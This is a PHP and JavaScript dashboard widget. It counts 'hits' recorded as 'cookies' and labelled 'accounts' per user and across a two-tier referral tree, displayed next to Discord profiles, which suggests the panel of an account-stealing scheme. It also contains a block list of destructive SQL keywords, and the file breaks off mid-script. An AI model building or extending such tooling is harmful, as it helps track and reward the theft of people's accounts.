<?php
/* ---- functions this file uses (formerly from libs/functions.php, which is no longer needed) ---- */
if (!function_exists('executeSafeQuery')) {
function executeSafeQuery($sql, $params = []) {
    static $db = null;   // one database connection for the whole page (was: a new one for every query)
    if ($db === null) {
        include $_SERVER['DOCUMENT_ROOT'] . '/libs/connection.php';
    }
    
    // Block suspicious keywords (customize based on your needs)
$blockedKeywords = ['DROP TABLE', 'DELETE FROM', 'TRUNCATE TABLE', 'GRANT ', 'ALTER TABLE', 'CREATE TABLE', 'CREATE DATABASE'];
	foreach ($blockedKeywords as $keyword) {
        if (stripos($sql, $keyword) !== false) {
            throw new Exception("Suspicious SQL operation detected");
        }
    }

    try {
        $stmt = $db->prepare($sql);
        
        // Bind parameters securely
        foreach ($params as $key => $value) {
            $stmt->bindValue(is_int($key) ? $key + 1 : $key, $value, 
                is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR);
        }
        
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        error_log("Database error: " . $e->getMessage());
        return [];
    }
}
}
/* ---- end of the functions from libs/functions.php ---- */
if (!function_exists('ultimaAuthenticatedRegular')) {
    function ultimaAuthenticatedRegular()
    {
        static $authenticatedUser = null;
        if (is_array($authenticatedUser)) {
            return $authenticatedUser;
        }
        if (session_status() !== PHP_SESSION_ACTIVE) {
            session_name('token');
            if (!session_start()) {
                return null;
            }
        }
        if (session_name() !== 'token' || !function_exists('executeSafeQuery')) {
            return null;
        }
        $authCode = trim((string)($_SESSION['auth_code'] ?? ''));
        if ($authCode === '') {
            return null;
        }
        try {
            $rows = executeSafeQuery(
                'SELECT * FROM regular WHERE auth_code = :auth_code LIMIT 2',
                [':auth_code' => $authCode]
            );
        } catch (\Throwable $e) {
            return null;
        }
        if (!is_array($rows) || count($rows) !== 1 || !is_array($rows[0])) {
            return null;
        }
        $row = $rows[0];
        $storedAuthCode = (string)($row['auth_code'] ?? '');
        $resolvedLinkId = (int)($row['link_id'] ?? 0);
        if ($storedAuthCode === '' || !hash_equals($storedAuthCode, $authCode) || $resolvedLinkId <= 0) {
            return null;
        }
        $authenticatedUser = $row;
        return $authenticatedUser;
    }
}

if (empty($userData) || !is_array($userData) || (int)($userData['link_id'] ?? 0) <= 0) {
    $userData = function_exists('ultimaAuthenticatedRegular') ? ultimaAuthenticatedRegular() : null;
}
if (!is_array($userData)) {
    http_response_code(401);
    exit;
}
if (!function_exists('dashWidgetQuery')) {
    function dashWidgetQuery($sql, $params = [], $ttl = 60) {
        if (function_exists('ultimaPageQuery')) {
            return ultimaPageQuery($sql, $params, $ttl);
        }
        if (function_exists('executeSafeQuery')) {
            return executeSafeQuery($sql, $params);
        }
        return [];
    }
}


$link_id = (int)$userData['link_id'];
$linkId = $link_id;
$isTriplehook = (int)($userData['triplehook'] ?? 0) === 1;

if($isTriplehook){
    $lvl2 = "(SELECT link_id FROM regular WHERE referred_by = :link_id UNION SELECT r2.link_id FROM regular r2 WHERE r2.referred_by IN (SELECT td.link_id FROM triplehook_data td INNER JOIN regular r ON r.link_id = td.link_id WHERE r.referred_by = :link_id2))";

    $totalCookiesQuery = "SELECT COUNT(*) as total FROM hits WHERE link_id IN {$lvl2}";
    $totalCookiesResult = dashWidgetQuery($totalCookiesQuery, [':link_id' => $link_id, ':link_id2' => $link_id]);
    $totalCookies = $totalCookiesResult[0]['total'] ?? 0;

    $todayStart = date('Y-m-d 00:00:00');
    $todayCookiesQuery = "SELECT COUNT(*) as today_total FROM hits WHERE link_id IN {$lvl2} AND created_at >= :today_start";
    $todayCookiesResult = dashWidgetQuery($todayCookiesQuery, [':link_id' => $link_id, ':link_id2' => $link_id, ':today_start' => $todayStart]);
    $todayCookies = $todayCookiesResult[0]['today_total'] ?? 0;

    $monthlyAccountsQuery = "SELECT DATE_FORMAT(created_at, '%Y-%m') as month, COUNT(*) as total FROM hits WHERE link_id IN {$lvl2} AND created_at >= '2026-01-01' AND created_at < '2027-01-01' GROUP BY DATE_FORMAT(created_at, '%Y-%m') ORDER BY month ASC";
    $monthlyAccountsResult = dashWidgetQuery($monthlyAccountsQuery, [':link_id' => $link_id, ':link_id2' => $link_id]);

    $hourlyQuery = "SELECT HOUR(created_at) as hr, COUNT(*) as total FROM hits WHERE link_id IN {$lvl2} AND DATE(created_at) = CURDATE() GROUP BY HOUR(created_at) ORDER BY hr ASC";
    $hourlyResult = dashWidgetQuery($hourlyQuery, [':link_id' => $link_id, ':link_id2' => $link_id]);

    $weeklyQuery = "SELECT DATE(created_at) as day, COUNT(*) as total FROM hits WHERE link_id IN {$lvl2} AND created_at >= DATE_SUB(CURDATE(), INTERVAL (WEEKDAY(CURDATE())) DAY) GROUP BY DATE(created_at) ORDER BY day ASC";
    $weeklyResult = dashWidgetQuery($weeklyQuery, [':link_id' => $link_id, ':link_id2' => $link_id]);

    $monthDailyQuery = "SELECT DATE(created_at) as day, COUNT(*) as total FROM hits WHERE link_id IN {$lvl2} AND created_at >= DATE_SUB(CURDATE(), INTERVAL 29 DAY) GROUP BY DATE(created_at) ORDER BY day ASC";
    $monthDailyResult = dashWidgetQuery($monthDailyQuery, [':link_id' => $link_id, ':link_id2' => $link_id]);
}else{
    $totalCookiesQuery = "SELECT COUNT(*) as total FROM hits WHERE link_id = :link_id";
    $totalCookiesResult = dashWidgetQuery($totalCookiesQuery, [':link_id' => $link_id]);
    $totalCookies = $totalCookiesResult[0]['total'] ?? 0;

    $todayStart = date('Y-m-d 00:00:00');
    $todayCookiesQuery = "SELECT COUNT(*) as today_total FROM hits WHERE link_id = :link_id AND created_at >= :today_start";
    $todayCookiesResult = dashWidgetQuery($todayCookiesQuery, [':link_id' => $link_id, ':today_start' => $todayStart]);
    $todayCookies = $todayCookiesResult[0]['today_total'] ?? 0;

    $monthlyAccountsQuery = "SELECT DATE_FORMAT(created_at, '%Y-%m') as month, COUNT(*) as total 
        FROM hits WHERE link_id = :link_id 
        AND created_at >= '2026-01-01' AND created_at < '2027-01-01'
        GROUP BY DATE_FORMAT(created_at, '%Y-%m') ORDER BY month ASC";
    $monthlyAccountsResult = dashWidgetQuery($monthlyAccountsQuery, [':link_id' => $link_id]);

    $hourlyQuery = "SELECT HOUR(created_at) as hr, COUNT(*) as total FROM hits WHERE link_id = :link_id AND DATE(created_at) = CURDATE() GROUP BY HOUR(created_at) ORDER BY hr ASC";
    $hourlyResult = dashWidgetQuery($hourlyQuery, [':link_id' => $link_id]);

    $weeklyQuery = "SELECT DATE(created_at) as day, COUNT(*) as total FROM hits WHERE link_id = :link_id AND created_at >= DATE_SUB(CURDATE(), INTERVAL (WEEKDAY(CURDATE())) DAY) GROUP BY DATE(created_at) ORDER BY day ASC";
    $weeklyResult = dashWidgetQuery($weeklyQuery, [':link_id' => $link_id]);

    $monthDailyQuery = "SELECT DATE(created_at) as day, COUNT(*) as total FROM hits WHERE link_id = :link_id AND created_at >= DATE_SUB(CURDATE(), INTERVAL 29 DAY) GROUP BY DATE(created_at) ORDER BY day ASC";
    $monthDailyResult = dashWidgetQuery($monthDailyQuery, [':link_id' => $link_id]);
}

$monthlyAccountsData = [];
for ($i = 1; $i <= 12; $i++) {
    $monthlyAccountsData['2026-' . str_pad($i, 2, '0', STR_PAD_LEFT)] = 0;
}
if (!empty($monthlyAccountsResult)) {
    foreach ($monthlyAccountsResult as $row) {
        if (isset($monthlyAccountsData[$row['month']])) {
            $monthlyAccountsData[$row['month']] = (int)$row['total'];
        }
    }
}
$accountsChartJson = json_encode(array_values($monthlyAccountsData));

$hourlyData = array_fill(0, 24, 0);
if(!empty($hourlyResult)){foreach($hourlyResult as $row){$hourlyData[(int)$row['hr']] = (int)$row['total'];}}
$accHourlyJson = json_encode($hourlyData);

$weekStart = date('Y-m-d', strtotime('monday this week'));
$weeklyData = [];
for($i=0;$i<7;$i++){$d=date('Y-m-d',strtotime($weekStart." +{$i} days"));$weeklyData[$d]=0;}
if(!empty($weeklyResult)){foreach($weeklyResult as $row){if(isset($weeklyData[$row['day']])){$weeklyData[$row['day']]=(int)$row['total'];}}}
$accWeeklyJson = json_encode(array_values($weeklyData));
$accWeeklyLabels = json_encode(array_map(function($d){return date('D',strtotime($d));}, array_keys($weeklyData)));

$monthDailyData = [];
for($i=29;$i>=0;$i--){$d=date('Y-m-d',strtotime("-{$i} days"));$monthDailyData[$d]=0;}
if(!empty($monthDailyResult)){foreach($monthDailyResult as $row){if(isset($monthDailyData[$row['day']])){$monthDailyData[$row['day']]=(int)$row['total'];}}}
$accMonthJson = json_encode(array_values($monthDailyData));
$accMonthLabels = json_encode(array_map(function($d){return date('M d',strtotime($d));}, array_keys($monthDailyData)));

$todayText = $todayCookies > 0 ? "+{$todayCookies}" : "+0";
$cardTitle = $isTriplehook ? "Triplehook Accounts" : "Total Accounts";
$accHourlyLabelsArr = [];
for($h=0;$h<24;$h++){$accHourlyLabelsArr[]=str_pad($h,2,'0',STR_PAD_LEFT).':00';}
$accHourlyLabels = json_encode($accHourlyLabelsArr);

$dcUsername = $userData['discord_username'] ?? '';
$dcAvatar = $userData['discord_avatar'] ?? '';
$dcId = $userData['discord_id'] ?? '';
$dcAvatarUrl = '';
if(!empty($dcAvatar)){
    if(strpos($dcAvatar,'https://')===0){$dcAvatarUrl=$dcAvatar;}
    elseif(!empty($dcId)){$ext=(strpos($dcAvatar,'a_')===0)?'gif':'png';$dcAvatarUrl='https://cdn.discordapp.com/avatars/'.$dcId.'/'.$dcAvatar.'.'.$ext;}
}
?>
<link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,500&display=swap" rel="stylesheet">
<style>
@keyframes cardFadeUp{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
@keyframes borderPulse{0%{border-color:rgba(255,255,255,0.04)}50%{border-color:rgba(255,255,255,0.08)}100%{border-color:rgba(255,255,255,0.04)}}
@keyframes valuePulse{0%,100%{text-shadow:0 0 15px rgba(255,255,255,0.08)}50%{text-shadow:0 0 20px rgba(255,255,255,0.15)}}
@keyframes labelSlide{from{opacity:0;transform:translateX(-8px)}to{opacity:1;transform:translateX(0)}}
@keyframes todayPop{from{opacity:0;transform:scale(0.8)}to{opacity:1;transform:scale(1)}}
@keyframes iconFloat{0%,100%{transform:translateY(0)}50%{transform:translateY(-2px)}}
@keyframes sweepLine{0%,100%{left:-100%}50%{left:140%}}
.top-stats-grid{display:grid;grid-template-columns:1fr 1fr 1fr 2fr;gap:24px;margin-bottom:24px;margin-top:0;margin-left:0}
.modern-stat-card{position:relative;background:transparent;border:1px solid rgba(255,255,255,.07);border-radius:18px;padding:28px;overflow:hidden;transition:border-color .4s ease,box-shadow .4s ease;animation:cardFadeUp .6s cubic-bezier(.16,1,.3,1) both;box-shadow:none}
.modern-stat-card::before{display:none}
.modern-stat-card::after{content:'';position:absolute;top:0;left:-100%;width:50%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.02),transparent);animation:sweepLine 8s ease-in-out infinite;pointer-events:none;z-index:1}
.stat-icon-wrapper{position:absolute;top:14px;right:14px;width:32px;height:32px;display:flex;align-items:center;justify-content:center;background:none;border-radius:0;z-index:2;animation:iconFloat 4s ease-in-out infinite}
.stat-icon{width:20px;height:20px;opacity:0.6;object-fit:contain;transform:scale(1.1);transition:opacity .4s ease,transform .4s ease}
.stat-icon-svg{color:rgba(190,190,190,0.55);opacity:1;width:22px;height:22px}
.stat-icon.triplehook{font-family:'Rajdhani',sans-serif;font-size:1.3rem;font-weight:700;color:transparent;-webkit-text-stroke:1.5px rgba(255,255,255,0.85);background:none;border:none;width:auto;height:auto;opacity:1;transform:scale(1.1);transition:-webkit-text-stroke-color .4s ease,transform .4s ease}
.stat-content{position:relative;z-index:2}
.stat-label{font-family:'Rajdhani',sans-serif;font-size:0.72rem;font-weight:600;color:rgba(190,190,190,0.9);margin:0 0 6px 0;white-space:nowrap;letter-spacing:.5px;text-transform:uppercase;animation:labelSlide .5s cubic-bezier(.16,1,.3,1) .3s both}
.stat-value{font-family:'Rajdhani',sans-serif;font-size:1.65rem;font-weight:700;color:rgba(255,255,255,0.95);line-height:1;margin-bottom:8px;animation:valuePulse 5s ease-in-out infinite;text-shadow:0 0 20px rgba(255,255,255,0.08)}
.stat-today{font-family:'Rajdhani',sans-serif;font-size:0.78rem;font-weight:600;display:inline-flex;align-items:center;gap:4px;padding:2px 7px;border-radius:5px;animation:todayPop .4s cubic-bezier(.16,1,.3,1) .5s both}
.stat-today span{color:rgba(255,255,255,0.25);font-weight:400;opacity:1}
.stat-today.green{color:rgba(74,222,128,0.85);background:none;padding:0;border-radius:0}
.stat-bottom-row{display:flex;align-items:center;gap:8px;margin-top:8px;animation:labelSlide .5s cubic-bezier(.16,1,.3,1) .4s both}
.card-user-info{display:flex;align-items:center;gap:6px;opacity:0.7}
.card-user-avatar{width:14px;height:14px;border-radius:50%;object-fit:cover}
.card-user-avatar-placeholder{width:14px;height:14px;border-radius:50%;background:rgba(255,255,255,0.08);display:flex;align-items:center;justify-content:center;font-size:0.45rem;color:rgba(255,255,255,0.25)}
.card-user-name{font-family:'Rajdhani',sans-serif;font-size:0.62rem;font-weight:500;color:rgba(255,255,255,0.65);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:100px}
.stat-mini-chart{display:flex;align-items:flex-end;gap:2px;height:26px;margin-top:10px;position:relative;z-index:2;cursor:pointer;max-width:80px}
.stat-mini-bar{width:8px;min-width:8px;flex:0 0 auto;border-radius:2px 2px 0 0;background:rgba(220,38,38,0.75);transition:all 0.4s cubic-bezier(.16,1,.3,1);position:relative;min-height:2px}
.stat-mini-bar:hover{background:rgba(239,68,68,0.9);box-shadow:0 -3px 8px -2px rgba(220,38,38,0.3);transform:scaleY(1.12)}
.stat-mini-bar.zero{background:rgba(220,38,38,0.25)}
.stat-mini-bar.zero:hover{background:rgba(220,38,38,0.45);box-shadow:0 -2px 6px -2px rgba(220,38,38,0.2);transform:scaleY(1.08)}
@keyframes miniBarGrow{from{opacity:0;transform:scaleY(0)}to{opacity:1;transform:scaleY(1)}}
.stat-mini-bar{transform-origin:bottom;animation:miniBarGrow 0.6s cubic-bezier(.16,1,.3,1) both}
.stat-mini-bar:nth-child(1){animation-delay:0.1s}
.stat-mini-bar:nth-child(2){animation-delay:0.15s}
.stat-mini-bar:nth-child(3){animation-delay:0.2s}
.stat-mini-bar:nth-child(4){animation-delay:0.25s}
.stat-mini-bar:nth-child(5){animation-delay:0.3s}
.stat-mini-bar:nth-child(6){animation-delay:0.35s}
.stat-mini-bar:nth-child(7){animation-delay:0.4s}
.stat-mini-info{display:flex;align-items:center;justify-content:space-between;margin-top:4px;position:relative;z-index:2;animation:labelSlide .5s cubic-bezier(.16,1,.3,1) .55s both}
.stat-mini-labels{display:flex;gap:2px}
.stat-mini-label{font-family:'Rajdhani',sans-serif;font-size:0.5rem;color:rgba(255,255,255,0.25);flex:1;text-align:center;min-width:0}
.stat-mini-pct{font-family:'Rajdhani',sans-serif;font-size:0.65rem;font-weight:600;color:rgba(74,222,128,0.6);display:flex;align-items:center;gap:2px;white-space:nowrap}
.stat-mini-pct i{font-size:0.5rem}
.stat-dot{color:rgba(255,255,255,0.2);font-size:0.6rem;margin:0 2px}
.stat-tooltip{position:fixed;background:rgba(7,7,11,0.95);border:1px solid rgba(255,255,255,0.06);border-radius:10px;padding:10px 14px;font-size:0.72rem;pointer-events:none;opacity:0;transform:translateY(4px);transition:opacity 0.4s ease,transform 0.4s ease,left 0.15s ease,top 0.15s ease;z-index:999999;min-width:100px;backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px)}
.stat-tooltip.visible{opacity:1;transform:translateY(0)}
.stat-tooltip--modal{border:none}
.stat-tooltip--modal .stat-tooltip-title{border-bottom:none;padding-bottom:0;margin-bottom:4px}
.stat-tooltip-title{font-weight:600;color:rgba(255,255,255,0.9);margin-bottom:6px;font-size:0.78rem;padding-bottom:0}
.stat-tooltip-row{display:flex;align-items:center;gap:8px;margin:3px 0;color:rgba(255,255,255,0.7)}
.stat-tooltip-label{color:rgba(255,255,255,0.35)}
.stat-tooltip-dot{width:8px;height:8px;border-radius:2px;background:rgba(220,38,38,0.9);flex-shrink:0}
.stat-tooltip-value{color:#fff;font-weight:600;margin-left:auto}
@keyframes borderGlow{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
@keyframes borderFadeIn{0%{opacity:0}100%{opacity:0.6}}
.neon-hover-card{cursor:pointer;position:relative;overflow:hidden}
.neon-border-el{display:none}
.neon-border-el::after{content:'';position:absolute;inset:0;border-radius:19px;opacity:0;background:none}
.card-shimmer{position:absolute;top:-50%;left:0;width:30%;height:200%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.03),rgba(255,255,255,0.05),rgba(255,255,255,0.03),transparent);transform:translateX(-250%) rotate(15deg);pointer-events:none;z-index:1;will-change:transform}
.neon-hover-card{cursor:pointer;position:relative;overflow:hidden;border-color:transparent;box-shadow:none}
.stat-detail-btn{display:none}
@keyframes modalSlideIn{0%{transform:translateY(-40px) scale(0.95);opacity:0}100%{transform:translateY(0) scale(1);opacity:1}}
@keyframes modalSlideOut{0%{transform:translateY(0) scale(1);opacity:1}100%{transform:translateY(-30px) scale(0.95);opacity:0}}
@keyframes tabSlideIn{0%{opacity:0;transform:translateY(10px)}100%{opacity:1;transform:translateY(0)}}
@keyframes summaryPop{0%{opacity:0;transform:scale(0.8)}60%{transform:scale(1.05)}100%{opacity:1;transform:scale(1)}}
#chartModalOverlay{position:fixed;inset:0;background:rgba(0,0,0,0);z-index:99999;display:none;align-items:center;justify-content:center;transition:background 0.4s ease}
#chartModalOverlay.open{display:flex;background:rgba(0,0,0,0.70)}
.chart-modal{background:rgba(10,10,16,0.45);backdrop-filter:blur(24px);-webkit-backdrop-filter:blur(24px);border:1px solid rgba(255,255,255,0.06);border-radius:20px;width:90%;max-width:640px;padding:28px;position:relative;box-shadow:0 30px 80px rgba(0,0,0,0.4);animation:modalSlideIn 0.5s cubic-bezier(.16,1,.3,1) forwards}
#chartModalOverlay.shutting .chart-modal{animation:modalSlideOut 0.3s ease forwards}
.chart-modal-title{font-family:'DM Sans',sans-serif;font-size:1.15rem;font-weight:700;color:rgba(255,255,255,0.9);margin-bottom:22px;padding-bottom:12px;border-bottom:1px solid rgba(255,255,255,0.03);display:flex;align-items:center;gap:10px}
.chart-modal-title::before{content:'';display:inline-block;width:4px;height:18px;border-radius:2px;background:linear-gradient(180deg,rgba(255,255,255,0.9),rgba(255,255,255,0.5))}
.chart-modal-tabs{display:flex;gap:8px;margin-bottom:22px}
.chart-modal-tab{font-family:'DM Sans',sans-serif;font-size:0.78rem;font-weight:600;padding:7px 18px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:none;color:rgba(255,255,255,0.22);cursor:pointer;transition:all 0.3s cubic-bezier(.34,1.56,.64,1);text-transform:uppercase;letter-spacing:0.5px;position:relative;overflow:hidden}
.chart-modal-tab::after{content:'';position:absolute;inset:0;background:rgba(255,255,255,0.02);opacity:0;transition:opacity 0.3s ease}
.chart-modal-tab:hover::after{opacity:1}
.chart-modal-tab.active{border-color:rgba(255,255,255,0.1);color:rgba(255,255,255,0.55);background:rgba(255,255,255,0.04);transform:scale(1.05);box-shadow:none}
.chart-modal-tab:hover:not(.active){border-color:rgba(255,255,255,0.08);color:rgba(255,255,255,0.35);transform:scale(1.02)}
.chart-modal-tab:active{transform:scale(0.95)}
.who-btn{background:none;border:none;color:rgba(255,255,255,0.3);cursor:pointer;font-size:1.1rem;margin-left:auto;padding:2px 6px;transition:all 0.2s;line-height:1}
.who-btn:hover{color:rgba(255,255,255,0.5)}
.who-list-wrap{animation:whoFadeIn 0.3s ease}
.who-list-scroll{max-height:320px;overflow-y:auto;padding-right:6px;-webkit-overflow-scrolling:touch}
.who-list-scroll::-webkit-scrollbar{width:3px}
.who-list-scroll::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.08);border-radius:10px}
.who-row{display:flex;align-items:center;gap:12px;padding:10px 8px;border-bottom:1px solid rgba(255,255,255,0.03);animation:whoRowIn 0.3s ease both}
.who-row-av{width:32px;height:32px;border-radius:50%;object-fit:cover;flex-shrink:0}
.who-row-av-ph{width:32px;height:32px;border-radius:50%;background:rgba(255,255,255,0.06);display:flex;align-items:center;justify-content:center;color:rgba(255,255,255,0.2);font-size:0.55rem;flex-shrink:0}
.who-row-info{flex:1;min-width:0}
.who-row-name{font-family:'DM Sans',sans-serif;font-size:0.8rem;font-weight:600;color:rgba(255,255,255,0.8);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;display:block}
.who-row-date{font-family:'DM Sans',sans-serif;font-size:0.6rem;color:rgba(255,255,255,0.25);display:block}
.who-empty{text-align:center;padding:40px 10px;color:rgba(255,255,255,0.2);font-family:'DM Sans',sans-serif;font-size:0.8rem}
@keyframes whoFadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
@keyframes whoRowIn{from{opacity:0;transform:translateX(10px)}to{opacity:1;transform:translateX(0)}}
.chart-modal-canvas{width:100%;height:220px;border-radius:14px;background:none;border:none;display:block}
.chart-modal-summary{display:flex;gap:16px;margin-top:18px;padding-top:16px;border-top:1px solid rgba(255,255,255,0.04)}
.chart-modal-stat{flex:1;text-align:center;padding:8px 0;border-radius:10px;background:none}
.chart-modal-stat-label{font-family:'DM Sans',sans-serif;font-size:0.65rem;color:rgba(255,255,255,0.3);text-transform:uppercase;letter-spacing:0.5px;margin-bottom:4px}
.chart-modal-stat-value{font-family:'DM Sans',sans-serif;font-size:1.15rem;font-weight:700;color:rgba(255,255,255,0.85)}
@media(max-width:1400px){.top-stats-grid{grid-template-columns:repeat(2,1fr)}}
@media(max-width:768px){.top-stats-grid{grid-template-columns:1fr;gap:18px;margin-top:0;margin-bottom:18px}.modern-stat-card{padding:20px;border-radius:14px}.stat-icon-wrapper{width:28px;height:28px;top:10px;right:10px}.stat-icon{width:16px;height:16px}.stat-icon.triplehook{font-size:1.1rem;-webkit-text-stroke-width:1.2px}.stat-label{font-size:0.68rem}.stat-value{font-size:1.4rem}.stat-today{font-size:0.72rem;padding:2px 5px}.stat-mini-chart{height:22px;margin-top:8px;max-width:70px}.stat-mini-label{font-size:0.45rem}.stat-mini-pct{font-size:0.6rem}.chart-modal{width:95%;padding:20px;border-radius:16px}.chart-modal-canvas{height:180px}.chart-modal-tabs{gap:6px}.chart-modal-tab{padding:5px 12px;font-size:0.72rem}}
@media(max-width:480px){.modern-stat-card{padding:16px;border-radius:12px}.stat-icon-wrapper{width:24px;height:24px;top:8px;right:8px}.stat-icon{width:14px;height:14px}.stat-icon.triplehook{font-size:1rem;-webkit-text-stroke-width:1px}.stat-label{font-size:0.65rem}.stat-value{font-size:1.25rem}.stat-today{font-size:0.68rem;padding:2px 4px}.stat-mini-chart{height:20px;margin-top:6px;max-width:65px}.stat-bottom-row{gap:5px;margin-top:6px}.stat-dot{font-size:0.5rem}.card-user-name{max-width:70px;font-size:0.58rem}.card-user-avatar,.card-user-avatar-placeholder{width:12px;height:12px}.chart-modal{padding:16px;border-radius:14px}.chart-modal-canvas{height:150px}.chart-modal-summary{flex-wrap:wrap;gap:10px}.chart-modal-stat{min-width:calc(50% - 10px)}}
</style>
<div class="modern-stat-card neon-hover-card" id="accounts-stat-card" data-color="gold" data-chart-title="<?= $cardTitle ?>" data-hourly='<?= $accHourlyJson ?>' data-hourly-labels='<?= $accHourlyLabels ?>' data-weekly='<?= $accWeeklyJson ?>' data-weekly-labels='<?= $accWeeklyLabels ?>' data-monthly='<?= $accMonthJson ?>' data-monthly-labels='<?= $accMonthLabels ?>'>
    <div class="neon-border-el"></div>
    <div class="stat-detail-btn">View Details</div>
    <div class="stat-icon-wrapper">
        <?php if($isTriplehook): ?>
        <div class="stat-icon triplehook">T</div>
        <?php else: ?>
        <svg class="stat-icon stat-icon-svg" viewBox="0 0 32 32" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="M 16 4 C 9.371094 4 4 9.371094 4 16 C 4 22.628906 9.371094 28 16 28 C 22.628906 28 28 22.628906 28 16 C 28 15.515625 27.964844 15.039063 27.90625 14.566406 C 27.507813 14.839844 27.023438 15 26.5 15 C 25.421875 15 24.511719 14.3125 24.160156 13.359375 C 23.535156 13.757813 22.796875 14 22 14 C 19.789063 14 18 12.210938 18 10 C 18 9.265625 18.210938 8.585938 18.558594 7.992188 C 18.539063 7.996094 18.519531 8 18.5 8 C 17.117188 8 16 6.882813 16 5.5 C 16 4.941406 16.1875 4.433594 16.496094 4.019531 C 16.332031 4.011719 16.167969 4 16 4 Z M 23.5 4 C 22.671875 4 22 4.671875 22 5.5 C 22 6.328125 22.671875 7 23.5 7 C 24.328125 7 25 6.328125 25 5.5 C 25 4.671875 24.328125 4 23.5 4 Z M 14.050781 6.1875 C 14.25 7.476563 15 8.585938 16.046875 9.273438 C 16.015625 9.511719 16 9.757813 16 10 C 16 13.308594 18.691406 16 22 16 C 22.496094 16 22.992188 15.9375 23.46875 15.8125 C 24.152344 16.4375 25.015625 16.851563 25.953125 16.96875 C 25.464844 22.03125 21.1875 26 16 26 C 10.484375 26 6 21.515625 6 16 C 6 11.152344 9.46875 7.097656 14.050781 6.1875 Z M 22 9 C 21.449219 9 21 9.449219 21 10 C 21 10.550781 21.449219 11 22 11 C 22.550781 11 23 10.550781 23 10 C 23 9.449219 22.550781 9 22 9 Z M 14 10 C 13.449219 10 13 10.449219 13 11 C 13 11.550781 13.449219 12 14 12 C 14.550781 12 15 11.550781 15 11 C 15 10.449219 14.550781 10 14 10 Z M 27 10 C 26.449219 10 26 10.449219 26 11 C 26 11.550781 26.449219 12 27 12 C 27.550781 12 28 11.550781 28 11 C 28 10.449219 27.550781 10 27 10 Z M 11 13 C 9.894531 13 9 13.894531 9 15 C 9 16.105469 9.894531 17 11 17 C 12.105469 17 13 16.105469 13 15 C 13 13.894531 12.105469 13 11 13 Z M 16 15 C 15.449219 15 15 15.449219 15 16 C 15 16.550781 15.449219 17 16 17 C 16.550781 17 17 16.550781 17 16 C 17 15.449219 16.550781 15 16 15 Z M 12.5 19 C 11.671875 19 11 19.671875 11 20.5 C 11 21.328125 11.671875 22 12.5 22 C 13.328125 22 14 21.328125 14 20.5 C 14 19.671875 13.328125 19 12.5 19 Z M 19.5 20 C 18.671875 20 18 20.671875 18 21.5 C 18 22.328125 18.671875 23 19.5 23 C 20.328125 23 21 22.328125 21 21.5 C 21 20.671875 20.328125 20 19.5 20 Z"/></svg>
        <?php endif; ?>
    </div>
    <div class="stat-content">
        <div class="stat-label"><?= $cardTitle ?></div>
        <div class="stat-value counter-animate" data-target="<?= $totalCookies ?>">0</div>
        <div class="stat-bottom-row">
            <div class="card-user-info">
                <?php if(!empty($dcAvatarUrl)): ?><img src="<?=htmlspecialchars($dcAvatarUrl)?>" class="card-user-avatar" alt=""><?php else: ?><div class="card-user-avatar-placeholder"><i class="fas fa-user"></i></div><?php endif; ?>
                <span class="card-user-name"><?=htmlspecialchars($dcUsername ?: 'Unknown')?></span>
            </div>
            <span class="stat-dot">•</span>
            <div class="stat-today green"><?= $todayText ?> <span>today</span></div>
        </div>
        <div class="stat-mini-chart" id="accMiniChart"></div>
        <div class="stat-mini-info"><div class="stat-mini-labels" id="accMiniLabels"></div><div class="stat-mini-pct" id="accMiniPct"></div></div>
    </div>
</div>
<div id="chartModalOverlay">
    <div class="chart-modal" id="chartModalBox">
        <div class="chart-modal-title"><span id="chartModalTitle">Statistics</span><button class="who-btn" id="whoBtn"><i class="fas fa-chevron-right"></i></button></div>
        <div class="chart-modal-tabs">
            <button class="chart-modal-tab active" data-period="today">Today (Hourly)</button>
            <button class="chart-modal-tab" data-period="weekly">Last 7 Days</button>
            <button class="chart-modal-tab" data-period="monthly">Last 30 Days</button>
        </div>
        <canvas class="chart-modal-canvas" id="chartModalCanvas"></canvas>
        <div class="chart-modal-summary">
            <div class="chart-modal-stat"><div class="chart-modal-stat-label" id="cmLabel1">Total (Today)</div><div class="chart-modal-stat-value" id="cmTotal">0</div></div>
            <div class="chart-modal-stat"><div class="chart-modal-stat-label" id="cmLabel2">Highest Hour</div><div class="chart-modal-stat-value" id="cmPeak">0</div></div>
            <div class="chart-modal-stat"><div class="chart-modal-stat-label" id="cmLabel3">Peak %</div><div class="chart-modal-stat-value" id="cmAvg">0%</div></div>
        </div>
        <div class="who-list-wrap" id="whoListWrap" style="display:none">
            <div class="who-list-scroll" id="whoPhoneList"></div>
        </div>
    </div>
</div>
<script>
(function(){
    var _tt=document.createElement('div');_tt.className='stat-tooltip';document.body.appendChild(_tt);
    var _mn=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
    function _fmt(n){if(n>=1e6)return(n/1e6).toFixed(2)+'M';if(n>=1e3)return(n/1e3).toFixed(2)+'K';return n.toLocaleString();}
    drawStatBgChart=function(){};
    window.buildMiniChart=function(containerId,labelId,pctId,data,labels,tooltipLabel){
        var c=document.getElementById(containerId);var l=document.getElementById(labelId);var p=document.getElementById(pctId);
        if(!c)return;var mx=Math.max.apply(null,data)||1;var tl=tooltipLabel||'Count';
        var today=data[data.length-1]||0;var yesterday=data[data.length-2]||0;
        var pct=yesterday>0?Math.round(((today-yesterday)/yesterday)*100):today>0?100:0;
        var bars=c.querySelectorAll('.stat-mini-bar');
        var reuse=bars.length===data.length;
        if(!reuse){c.innerHTML='';bars=[];}
        var labelNodes=l?l.querySelectorAll('.stat-mini-label'):[];
        if(l&&labelNodes.length!==data.length){l.innerHTML='';labelNodes=[];}
        for(var i=0;i<data.length;i++){
